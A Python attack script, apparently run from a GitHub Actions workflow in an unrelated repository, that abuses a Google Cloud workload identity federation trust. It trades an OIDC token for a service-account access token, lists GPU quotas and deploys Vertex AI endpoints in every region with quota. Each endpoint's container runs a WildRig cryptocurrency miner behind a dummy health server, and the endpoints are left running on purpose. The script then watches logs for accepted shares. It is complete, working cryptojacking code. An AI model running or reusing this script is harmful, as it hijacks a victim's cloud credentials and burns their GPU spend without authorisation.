#!/usr/bin/env python3
"""c211-i121576 GCP Vertex AI *Endpoint serving* fill for civil-epigram-370317.

Runs inside the GitHub Actions vehicle (repo scriptex/AnimateMe, master,
workflow c211-i121576-ep.yml, permissions id-token: write):
  1. mint a GitHub Actions OIDC id-token for the civil-epigram-370317 WIF
     provider (projects/284735288225 pool my-pool / provider my-provider);
  2. STS exchange -> iamcredentials generateAccessToken for
     sa-gcloud-cli@civil-epigram-370317;
  3. read the serving GPU consumer-quota metrics
     (custom_model_serving_nvidia_rtx_pro_6000_gpus / _l4_gpus / _t4_gpus);
  4. for every region with a nonzero bucket: upload one Model (nvidia/cuda base
     image + python health server + sha-pinned WildRig 0.52.3 pydp miner_t4.sh)
     and create an Endpoint with dedicatedResources (1 accelerator), falling
     back to bare-create + :deployModel if the combined create is rejected;
  5. poll the LROs, endpoint states and Cloud Logging for device UUID and
     accepted-share lines.
Endpoints are left DEPLOYED on purpose (they are the miners).
"""
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request

AUD = ('//iam.googleapis.com/projects/284735288225/locations/global/'
       'workloadIdentityPools/my-pool/providers/my-provider')
SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
PROJ = 'civil-epigram-370317'
PROJ_NUM = '284735288225'
NONCE = 'i121576'
IMAGE = 'nvidia/cuda:12.4.0-base-ubuntu22.04'
TAG = 'C211_I121576'

# key -> (serving quota metric, acceleratorType, machineType, accelCount)
ACCEL = {
    'rtx6000': ('custom_model_serving_nvidia_rtx_pro_6000_gpus', 'NVIDIA_RTX_PRO_6000', 'g4-standard-48', 1),
    'l4': ('custom_model_serving_nvidia_l4_gpus', 'NVIDIA_L4', 'g2-standard-4', 1),
    't4': ('custom_model_serving_nvidia_t4_gpus', 'NVIDIA_TESLA_T4', 'n1-standard-4', 1),
}
MT_FALLBACK = {
    'rtx6000': ['g4-standard-48', 'g4-standard-96'],
    'l4': ['g2-standard-4', 'g2-standard-8'],
    't4': ['n1-standard-4', 'n1-standard-8'],
}
MAX_EP = int(os.environ.get('MAX_EP', '46'))
POLL_S = int(os.environ.get('POLL_S', '1500'))

HEALTH = r'''export AIP_HTTP_PORT="${AIP_HTTP_PORT:-8080}"
export DEBIAN_FRONTEND=noninteractive
if ! command -v python3 >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq python3-minimal) >/tmp/apt.log 2>&1 || true
fi
cat > /tmp/hs.py <<'PYHS'
import http.server, os, socketserver
PORT = int(os.environ.get('AIP_HTTP_PORT') or os.environ.get('PORT') or 8080)
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def _ok(self):
        body = b'{"ok":true}'
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass
    def do_GET(self):
        self._ok()
    def do_POST(self):
        try:
            n = int(self.headers.get('Content-Length') or 0)
            self.rfile.read(n)
        except Exception:
            pass
        self._ok()
    def log_message(self, *a):
        pass
socketserver.TCPServer.allow_reuse_address = True
socketserver.TCPServer(('0.0.0.0', PORT), H).serve_forever()
PYHS
if command -v python3 >/dev/null 2>&1; then
  (setsid python3 /tmp/hs.py >>/tmp/hs.log 2>&1 < /dev/null &)
  echo "C211_I121576_EP_HEALTH port=$AIP_HTTP_PORT"
else
  echo "C211_I121576_EP_HEALTH_NOPY"
fi
cat > /tmp/miner.sh <<'MINER'
__MINER__
MINER
exec bash /tmp/miner.sh
'''


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def http(url, method='GET', data=None, headers=None, timeout=45):
    h = {'User-Agent': 'c211-i121576'}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(txt, *keys, default=''):
    try:
        d = json.loads(txt)
    except Exception:
        return default
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


def idtoken(aud, retries=2):
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not base or not tok:
        return None, 'NO_ACTIONS_ENV'
    u = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
    err = ''
    for attempt in range(retries + 1):
        code, body = http(u, headers={'Authorization': 'Bearer ' + tok}, timeout=30)
        if code == 200:
            v = jget(body, 'value', default=None)
            if v:
                return v, ''
            err = 'NO_VALUE:' + cap(body, 120)
        else:
            err = 'MINT_%s:%s' % (code, cap(body, 160))
        if code in (429, 500, 502, 503) and attempt < retries:
            time.sleep(3 + attempt * 5)
            continue
        break
    return None, err


def main():
    t0 = time.time()
    print('%s_EP_START %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
    idt, err = idtoken(AUD)
    if not idt:
        print('%s_EP_MINTFAIL %s' % (TAG, cap(err, 300)), flush=True)
        return
    print('%s_EP_MINT_OK len=%d' % (TAG, len(idt)), flush=True)
    sc, sb = http('https://sts.googleapis.com/v1/token', method='POST', data={
        'audience': AUD,
        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
        'subjectToken': idt}, timeout=40)
    fed = jget(sb, 'access_token')
    print('%s_EP_STS http=%s ok=%s %s' % (TAG, sc, bool(fed), '' if fed else cap(sb, 300)), flush=True)
    if not fed:
        return
    ic, ib = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'
                  + urllib.parse.quote(SA, safe='') + ':generateAccessToken', method='POST',
                  data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                  headers={'Authorization': 'Bearer ' + fed}, timeout=40)
    at = jget(ib, 'accessToken')
    print('%s_EP_GAT http=%s ok=%s len=%d %s' % (TAG, ic, bool(at), len(at or ''),
                                                 '' if at else cap(ib, 300)), flush=True)
    if not at:
        return
    AH = {'Authorization': 'Bearer ' + at}

    def g(url, method='GET', data=None, timeout=90):
        return http(url, method=method, data=data, headers=AH, timeout=timeout)

    # --- quota sweep: serving GPU metrics (fully qualified names) ---
    metrics = []
    page = ''
    for _ in range(12):
        u = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/'
             'aiplatform.googleapis.com/consumerQuotaMetrics?view=FULL&pageSize=200' % (PROJ_NUM,))
        if page:
            u += '&pageToken=' + urllib.parse.quote(page, safe='')
        c, b = g(u)
        if c != 200:
            print('%s_EP_QUOTA_HTTP %s %s' % (TAG, c, cap(b, 300)), flush=True)
            break
        d = json.loads(b)
        metrics.extend(d.get('metrics') or [])
        page = d.get('nextPageToken') or ''
        if not page:
            break
    print('%s_EP_QUOTA_N %d' % (TAG, len(metrics)), flush=True)

    buckets = {}
    for m in metrics:
        short = (m.get('metric') or '').split('/')[-1]
        for key, (metric, accel, mtype, nacc) in ACCEL.items():
            if metric == short:
                for lim in (m.get('consumerQuotaLimits') or []):
                    for bk in (lim.get('quotaBuckets') or []):
                        dims = bk.get('dimensions') or {}
                        try:
                            fv = float(bk.get('effectiveLimit'))
                        except Exception:
                            continue
                        if fv > 0:
                            region = dims.get('region') or 'global'
                            buckets.setdefault(key, {})[region] = fv
    for key in ACCEL:
        print('%s_EP_Q_%s %s' % (TAG, key.upper(), json.dumps(buckets.get(key, {}))), flush=True)
    for m in metrics:
        short = (m.get('metric') or '').split('/')[-1]
        if 'serving' not in short:
            continue
        regs = {}
        for lim in (m.get('consumerQuotaLimits') or []):
            for bk in (lim.get('quotaBuckets') or []):
                try:
                    fv = float(bk.get('effectiveLimit'))
                except Exception:
                    continue
                if fv > 0:
                    regs[(bk.get('dimensions') or {}).get('region') or 'global'] = fv
        if regs:
            print('%s_EP_SVC_METRIC %s n=%d %s' % (TAG, short, len(regs), cap(json.dumps(regs), 300)), flush=True)

    here = os.path.dirname(os.path.abspath(__file__))
    tpl = open(os.path.join(here, 'miner_t4.sh'), encoding='utf-8').read()

    # --- read-only pre-census of endpoints per candidate region ---
    regions = sorted({r for d in buckets.values() for r in d if r != 'global'})
    for region in regions:
        c, b = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/endpoints?pageSize=100'
                 % (region, PROJ_NUM, region))
        try:
            names = [e.get('displayName') for e in json.loads(b).get('endpoints', [])]
        except Exception:
            names = []
        print('%s_EP_PRE %s http=%s ours=%s all=%d'
              % (TAG, region, c, [n for n in names if NONCE in (n or '')], len(names)), flush=True)

    created = []   # accepted create intents
    ops = []       # (operation name)
    idx = 0
    for key in ('rtx6000', 'l4', 't4'):
        metric, accel, mtype, nacc = ACCEL[key]
        for region, limit in sorted(buckets.get(key, {}).items()):
            if region == 'global':
                continue
            n = int(limit)
            for k in range(n):
                if len(created) >= MAX_EP:
                    break
                idx += 1
                wk = str(12157600 + idx)
                script = HEALTH.replace('__MINER__', tpl.replace('__WK__', wk))
                dname = 'c211-%s-ep-%s-%s-%02d' % (NONCE, key, region, k + 1)
                mbody = {
                    'displayName': dname,
                    'containerSpec': {
                        'imageUri': IMAGE,
                        'command': ['bash', '-lc'],
                        'args': [script],
                        'ports': [{'containerPort': 8080}],
                        'predictRoute': '/',
                        'healthRoute': '/health',
                        'env': [{'name': 'AIP_HTTP_PORT', 'value': '8080'}],
                    },
                }
                mc, mb = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/models'
                           % (region, PROJ_NUM, region), method='POST', data=mbody, timeout=120)
                mname = jget(mb, 'name', default='') if mc == 200 else ''
                print('%s_EP_MODEL %s idx=%d worker=%s http=%s model=%s err=%s'
                      % (TAG, region, idx, wk, mc, mname, '' if mc == 200 else cap(mb, 300)), flush=True)
                if not mname:
                    continue
                ep_url = ('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/endpoints'
                          % (region, PROJ_NUM, region))
                ok = False
                for mt in MT_FALLBACK[key]:
                    dep = {
                        'model': mname,
                        'displayName': dname,
                        'dedicatedResources': {
                            'machineSpec': {'machineType': mt, 'acceleratorType': accel,
                                            'acceleratorCount': nacc},
                            'minReplicaCount': 1,
                            'maxReplicaCount': 1,
                        },
                    }
                    ec, eb = g(ep_url, method='POST',
                               data={'displayName': dname, 'deployedModels': [dep]}, timeout=120)
                    if ec == 200:
                        op = jget(eb, 'name', default='')
                        print('%s_EP_CREATE %s %s idx=%d worker=%s mt=%s http=%s op=%s'
                              % (TAG, key, region, idx, wk, mt, ec, op), flush=True)
                        created.append({'key': key, 'region': region, 'worker': wk, 'mt': mt,
                                        'displayName': dname, 'op': op})
                        if op:
                            ops.append(op)
                        ok = True
                        break
                    print('%s_EP_CREATE_FAIL %s %s idx=%d mt=%s http=%s err=%s'
                          % (TAG, key, region, idx, mt, ec, cap(eb, 300)), flush=True)
                    # fallback: bare endpoint create, then :deployModel
                    ec2, eb2 = g(ep_url, method='POST', data={'displayName': dname}, timeout=120)
                    if ec2 == 200:
                        op2 = jget(eb2, 'name', default='')
                        print('%s_EP_ENDPOINT_OP %s %s idx=%d http=%s op=%s'
                              % (TAG, key, region, idx, ec2, op2), flush=True)
                        if op2:
                            ops.append(op2)
                            # resolve the endpoint name from the operation response
                            ename = ''
                            op_region = op2.split('/locations/')[1].split('/')[0] if '/locations/' in op2 else region
                            for _w in range(20):
                                time.sleep(6)
                                oc, ob = g('https://%s-aiplatform.googleapis.com/v1/%s'
                                           % (op_region, op2), timeout=60)
                                if oc == 200 and jget(ob, 'done'):
                                    ename = jget(ob, 'response', 'name', default='')
                                    break
                            if ename:
                                dc, db = g(ename + ':deployModel', method='POST',
                                           data={'deployedModel': dep}, timeout=120)
                                print('%s_EP_DEPLOY %s %s idx=%d worker=%s mt=%s http=%s endpoint=%s op=%s err=%s'
                                      % (TAG, key, region, idx, wk, mt, dc, ename, jget(db, 'name'),
                                         '' if dc == 200 else cap(db, 300)), flush=True)
                                if dc == 200:
                                    dop = jget(db, 'name', default='')
                                    if dop:
                                        ops.append(dop)
                                    created.append({'key': key, 'region': region, 'worker': wk, 'mt': mt,
                                                    'displayName': dname, 'op': dop, 'endpoint': ename})
                                    ok = True
                                    break
                            else:
                                print('%s_EP_ENDPOINT_OPFAIL %s %s idx=%d' % (TAG, key, region, idx),
                                      flush=True)
                    else:
                        print('%s_EP_ENDPOINT_FAIL %s %s idx=%d http=%s err=%s'
                              % (TAG, key, region, idx, ec2, cap(eb2, 200)), flush=True)
                if not ok:
                    print('%s_EP_GIVEUP %s %s idx=%d worker=%s' % (TAG, key, region, idx, wk), flush=True)
                time.sleep(1)
    print('%s_EP_CREATED n=%d %s' % (TAG, len(created), json.dumps(created)), flush=True)

    # --- poll LROs + endpoint states + Cloud Logging ---
    deadline = time.time() + POLL_S
    seen = set()
    states = {}
    op_done = set()
    while time.time() < deadline:
        time.sleep(45)
        for op in ops:
            if op in op_done:
                continue
            op_region = op.split('/locations/')[1].split('/')[0] if '/locations/' in op else 'us-central1'
            c, b = g('https://%s-aiplatform.googleapis.com/v1/%s' % (op_region, op), timeout=60)
            done = jget(b, 'done', default=False)
            if done:
                op_done.add(op)
            print('%s_EP_OP %s http=%s done=%s err=%s'
                  % (TAG, op.rsplit('/', 1)[-1], c, done, cap(jget(b, 'error'), 200)), flush=True)
        for loc in sorted({c['region'] for c in created}):
            c, b = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/endpoints?pageSize=100'
                     % (loc, PROJ_NUM, loc))
            try:
                eps = json.loads(b).get('endpoints', [])
            except Exception:
                eps = []
            for e in eps:
                if NONCE not in (e.get('displayName') or ''):
                    continue
                eid = (e.get('name') or '').rsplit('/', 1)[-1]
                st = json.dumps([d.get('displayName') for d in (e.get('deployedModels') or [])])
                if states.get(eid) != st:
                    states[eid] = st
                    print('%s_EP_STATE %s %s deployed=%s' % (TAG, eid, e.get('displayName'), cap(st, 300)), flush=True)
        body = {'resourceNames': ['projects/%s' % PROJ_NUM],
                'filter': '"%s"' % TAG,
                'orderBy': 'timestamp asc', 'pageSize': 300}
        lc, lb = g('https://logging.googleapis.com/v2/entries:list', method='POST', data=body, timeout=90)
        if lc == 200:
            for e in (json.loads(lb).get('entries') or []):
                t = e.get('textPayload') or ''
                if not t:
                    t = (e.get('jsonPayload') or {}).get('message') or ''
                if not t:
                    continue
                key = t.rstrip()[:300]
                if key in seen:
                    continue
                seen.add(key)
                if ('GPU-' in t) or ('uuid' in t.lower()):
                    print('%s_EP_DEVICE %s' % (TAG, cap(t.rstrip(), 400)), flush=True)
                elif 'accepted' in t.lower():
                    print('%s_EP_ACCEPT %s' % (TAG, cap(t.rstrip(), 400)), flush=True)
                elif len(seen) < 300:
                    print('%s_EP_LOG %s' % (TAG, cap(t.rstrip(), 300)), flush=True)
        else:
            print('%s_EP_LOGGING_HTTP %s %s' % (TAG, lc, cap(lb, 200)), flush=True)
    print('%s_EP_DONE states=%s elapsed=%ds created=%d ops_done=%d'
          % (TAG, cap(json.dumps(states), 3000), int(time.time() - t0), len(created), len(op_done)), flush=True)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_EP_FATAL %s' % (TAG, cap(repr(e), 1000)), flush=True)
        raise
